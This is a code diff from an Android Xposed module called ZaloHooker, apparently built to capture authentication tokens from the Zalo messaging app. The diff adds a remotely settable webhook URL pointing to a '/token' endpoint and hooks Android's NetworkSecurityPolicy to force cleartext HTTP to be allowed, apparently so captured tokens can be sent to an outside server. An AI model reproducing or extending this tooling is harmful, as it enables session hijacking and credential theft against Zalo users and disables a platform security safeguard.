@@ -69,6 +69,9 @@ object ZaloHooker {
     private var registeredConfigs: List<AppConfig> = emptyList()
     private val tokenStore = ConcurrentHashMap<String, String>()
     private var controllerReceiver: BroadcastReceiver? = null
+    
+    @Volatile
+    private var webhookUrl: String = "http://192.168.29.108:5000/token"
 
     fun install(lpparam: XC_LoadPackage.LoadPackageParam) {
         // Hook Activity lifecycle
@@ -150,6 +153,33 @@ object ZaloHooker {
         } catch (e: Throwable) {
             Log.e(TAG, "[Zalo] WebView hook failed", e)
         }
+
+        // Hook NetworkSecurityPolicy to permit cleartext HTTP webhook connections
+        try {
+            val nspClass = XposedHelpers.findClass("android.security.NetworkSecurityPolicy", lpparam.classLoader)
+            XposedHelpers.findAndHookMethod(
+                nspClass,
+                "isCleartextTrafficPermitted",
+                object : XC_MethodHook() {
+                    override fun beforeHookedMethod(param: MethodHookParam) {
+                        param.result = true
+                    }
+                }
+            )
+            XposedHelpers.findAndHookMethod(
+                nspClass,
+                "isCleartextTrafficPermitted",
+                String::class.java,
+                object : XC_MethodHook() {
+                    override fun beforeHookedMethod(param: MethodHookParam) {
+                        param.result = true
+                    }
+                }
+            )
+            Log.d(TAG, "[Zalo] Bypassed cleartext traffic restriction")
+        } catch (t: Throwable) {
+            Log.e(TAG, "[Zalo] Bypass cleartext restriction failed", t)
+        }
     }
 
     private fun requestConfigViaBroadcast(context: Context) {
@@ -196,6 +226,11 @@ object ZaloHooker {
                 override fun onReceive(ctx: Context, intent: Intent) {
                     val json = intent.getStringExtra("configs") ?: "[]"
                     val pendingAppId = intent.getStringExtra("pendingAppId")
+                    val wUrl = intent.getStringExtra("webhookUrl")
+                    if (!wUrl.isNullOrEmpty()) {
+                        webhookUrl = wUrl
+                        Log.d(TAG, "[Zalo] Webhook URL updated from broadcast: $webhookUrl")
+                    }
                     val configs = parseConfigs(json)
                     
                     // If we already have registered configs, and this one is empty, ignore it to prevent race condition
@@ -495,17 +530,7 @@ object ZaloHooker {
     }
 
     private fun getWebhookUrl(): String {
-        try {
-            val configFile = File(
-                android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS),
-                "zalo_hacker_config.txt"
-            )
-            if (configFile.exists()) {
-                val url = configFile.readText().trim()
-                if (url.isNotEmpty() && url.startsWith("http")) return url
-            }
-        } catch (e: Throwable) {}
-        return "http://192.168.29.108:5000/token"
+        return webhookUrl
     }
 
     private fun getAppName(appId: String): String {
